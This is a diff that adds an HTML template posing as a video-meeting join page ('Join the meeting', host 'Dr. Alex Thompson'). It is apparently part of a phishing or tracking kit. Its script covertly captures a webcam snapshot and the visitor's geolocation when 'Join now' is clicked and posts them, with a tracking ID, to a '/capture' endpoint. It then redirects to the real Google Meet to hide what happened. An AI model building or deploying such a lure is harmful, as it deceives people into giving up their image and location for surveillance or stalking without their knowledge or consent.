@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virtual Meeting - Join Now</title>
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            color: #202124;
+        }
+        .header {
+            background-color: white;
+            padding: 12px 20px;
+            border-bottom: 1px solid #dadce0;
+            display: flex;
+            align-items: center;
+        }
+        .logo {
+            font-size: 22px;
+            font-weight: 500;
+            color: #5f6368;
+            display: flex;
+            align-items: center;
+        }
+        .logo-icon {
+            color: #00897b;
+            margin-right: 8px;
+            font-size: 24px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .join-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+            padding: 40px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .join-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #202124;
+        }
+        .meeting-info {
+            margin-bottom: 30px;
+        }
+        .info-item {
+            display: flex;
+            margin-bottom: 12px;
+        }
+        .info-label {
+            width: 120px;
+            color: #5f6368;
+            font-weight: 500;
+        }
+        .preview-container {
+            position: relative;
+            width: 100%;
+            height: 300px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+        }
+        .preview-placeholder {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            color: #5f6368;
+            flex-direction: column;
+        }
+        .preview-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .controls {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .control-btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background-color: white;
+            border: 1px solid #dadce0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 10px;
+            cursor: pointer;
+            color: #5f6368;
+        }
+        .control-btn.active {
+            background-color: #d2e3fc;
+            color: #1a73e8;
+        }
+        .control-btn.disabled {
+            background-color: #f1f3f4;
+            color: #9aa0a6;
+        }
+        .join-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+        }
+        .join-btn:hover {
+            background-color: #1765cc;
+        }
+        .privacy-notice {
+            text-align: center;
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <span class="logo-icon">●</span> Video Meeting
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="join-card">
+            <div class="join-title">Join the meeting</div>
+            
+            <div class="meeting-info">
+                <div class="info-item">
+                    <div class="info-label">Meeting ID:</div>
+                    <div>mcd-gfhy-pqr</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Host:</div>
+                    <div>Dr. Alex Thompson</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Time:</div>
+                    <div>Starting now</div>
+                </div>
+            </div>
+            
+            <div class="preview-container">
+                <div class="preview-placeholder" id="camera-placeholder">
+                    <div class="preview-icon">📷</div>
+                    <div>Camera off</div>
+                </div>
+                <video id="camera-preview" autoplay muted style="display: none;"></video>
+            </div>
+            
+            <div class="controls">
+                <div class="control-btn active" id="mic-btn">🎤</div>
+                <div class="control-btn disabled" id="camera-btn">📷</div>
+            </div>
+            
+            <button class="join-btn" id="join-btn">Join now</button>
+            
+            <div class="privacy-notice">
+                By joining, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get the tracking ID from the server if available
+        const trackingId = "{{ tracking_id|default('unknown') }}";
+        
+        // Elements
+        const cameraBtn = document.getElementById('camera-btn');
+        const micBtn = document.getElementById('mic-btn');
+        const joinBtn = document.getElementById('join-btn');
+        const cameraPlaceholder = document.getElementById('camera-placeholder');
+        const cameraPreview = document.getElementById('camera-preview');
+        
+        // Variables to store data
+        let capturedImage = null;
+        let locationData = { lat: null, lon: null };
+        let stream = null;
+        
+        // Camera button toggles camera preview
+        cameraBtn.addEventListener('click', async function() {
+            if (cameraBtn.classList.contains('disabled')) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    cameraPreview.srcObject = stream;
+                    cameraPreview.style.display = 'block';
+                    cameraPlaceholder.style.display = 'none';
+                    cameraBtn.classList.remove('disabled');
+                    cameraBtn.classList.add('active');
+                    
+                    // Also try to get location
+                    getLocation();
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                    alert('Could not access camera. Please check your permissions.');
+                }
+            } else {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                cameraPreview.style.display = 'none';
+                cameraPlaceholder.style.display = 'flex';
+                cameraBtn.classList.remove('active');
+                cameraBtn.classList.add('disabled');
+            }
+        });
+        
+        // Mic button toggle
+        micBtn.addEventListener('click', function() {
+            if (micBtn.classList.contains('active')) {
+                micBtn.classList.remove('active');
+                micBtn.classList.add('disabled');
+            } else {
+                micBtn.classList.remove('disabled');
+                micBtn.classList.add('active');
+            }
+        });
+        
+        // Join button handler
+        joinBtn.addEventListener('click', function() {
+            // If camera is on, capture image
+            if (stream && cameraBtn.classList.contains('active')) {
+                captureAndSend();
+            } else {
+                // Ask for camera permission
+                requestCameraAndCapture();
+            }
+        });
+        
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData.lat = position.coords.latitude;
+                        locationData.lon = position.coords.longitude;
+                    },
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                    }
+                );
+            }
+        }
+        
+        async function requestCameraAndCapture() {
+            try {
+                joinBtn.textContent = 'Joining...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                cameraPreview.srcObject = stream;
+                
+                // Brief delay to ensure video is initialized
+                setTimeout(() => {
+                    captureAndSend();
+                }, 1000);
+                
+                getLocation();
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                // Still redirect if camera fails
+                redirectToMeeting();
+            }
+        }
+        
+        function captureAndSend() {
+            // Create canvas to capture frame
+            const canvas = document.createElement('canvas');
+            canvas.width = cameraPreview.videoWidth;
+            canvas.height = cameraPreview.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
+            
+            // Get image data
+            capturedImage = canvas.toDataURL('image/jpeg');
+            
+            // Stop the stream
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Send data to server
+            sendDataToServer();
+            
+            // Redirect to a real meeting service
+            redirectToMeeting();
+        }
+        
+        function redirectToMeeting() {
+            joinBtn.textContent = 'Connecting...';
+            setTimeout(() => {
+                window.location.href = "https://meet.google.com/";
+            }, 1500);
+        }
+        
+        async function sendDataToServer() {
+            const data = {
+                tracking_id: trackingId,
+                image: capturedImage,
+                lat: locationData.lat,
+                lon: locationData.lon,
+                source: 'meet_template'
+            };
+            
+            try {
+                await fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+    </script>
+</body>
+</html>
